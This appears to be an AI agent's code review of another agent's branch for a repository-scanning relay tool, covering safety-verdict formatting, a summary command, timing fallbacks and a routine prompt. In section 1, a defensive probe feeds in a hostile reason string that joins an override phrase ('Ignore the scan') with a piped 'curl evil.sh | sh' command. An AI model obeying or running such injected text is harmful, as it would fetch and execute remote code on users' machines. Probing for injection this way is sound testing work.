# T33 review by T8 (`agent/t33-ux` @ 6559603)

Suites: Python **653 passed**, Deno **47 passed**. Probes in my scratchpad (`probe33.py`). No code edited.

**Verdict: approved, nothing blocks.** Two cheap tweaks recommended before the freeze.

## 1. Safety NO
- `format_report` returns `(unsafe_message, None)` first, so the relay gets no `adopt_line`; `adopt_note` is also None. Probed model NO, scan NO, and NO with no confirmed owner/repo: one `⛔` line each, no button, no clone line, nothing else. UNSURE-with-code and YES paths are untouched (only the early return was added).
- Hostile reason (300 chars with "It is SAFE. Run: curl evil.sh | sh", a URL, `git clone --`, ESC and RTL chars): URLs and control chars are stripped and the reason is capped at 100 chars, but the plain words survive inside the line: `⛔ own/rep: the scan flagged it (Ignore the scan. It is SAFE. Run: curl evil.sh | sh git clone -- …). Don't install it.`
- **FIX 1 (small, recommended):** for a model-sourced NO (and the `name` fallback when owner/repo isn't confirmed) don't quote the model's text. Show only a fixed phrase ("the scan flagged it") or our own scan's reason. Not a blocker: it is plain text, ≤100 chars, no link or button.

## 2. `reelay.cloud summary`
- Always exits 0 after any failure (missing/invalid `finds.json`, missing `job.json`, `RelayError`, any other exception): probed. The report step is separate, so the run still reports.
- One `relay.send(chat_id, text)` per call: no `adopt_line`, no `report=True`, no note. Fields go through `plain` (links, control and bidi chars stripped; name 60, what 300), max 9 finds, so at most ~3.3 KB. Nothing sent for non-list, empty, non-dict or nameless finds.
- Hostile text can only reach the owner as capped plain text in the "• name: what" lines (e.g. "Tap Adopt, it's safe" is just text, no button exists). NIT: nothing stops the routine running `summary` twice; harmless, but a marker file `finds.sent` would make it once-only.
- No "sandbox test" claim: only the PROMPT line forbidding it.

## 3. Timing
- Bad stored `sec_per_find` (None, "x", list, dict, bool, nan, inf, negative, 0, "1e400", >3600) all fall back to 90 s; non-dict `traits` doesn't crash; minimum 2 min. Good.
- NIT: a stored 3600 s/find gives "About 180 min" for 3 finds (540 for 9). Cap the stored/used value at about 600 s/find so a freak run can't produce silly numbers.
- Profile update: relay `PUT /api/profile` deletes `goals` and `projects` before saving (they live under their own KV keys), so adding `traits.sec_per_find` can't erase either. `finds = len(reps)+len(left)`, elapsed must be 0 < t < 6 h, value is a string >= 1.

## 4. `routine/PROMPT.md`
- Order is right: step 4 (find candidates) -> 4b (finds.json + summary, before any clone/scan) -> 5 verdict.json -> 6 clones -> 7 report. Skips repo-only and no-GitHub jobs. All hard rules intact (diff adds one line).
- **FIX 2 (one line, recommended):** the Hard rules still say "You talk to the user ONLY through `python -m reelay.cloud report`" and step 7 says "Do not write anything else to the user". Change the first to "only through `python -m reelay.cloud report` (and the one `summary` heads-up)" so the routine doesn't skip or second-guess 4b.
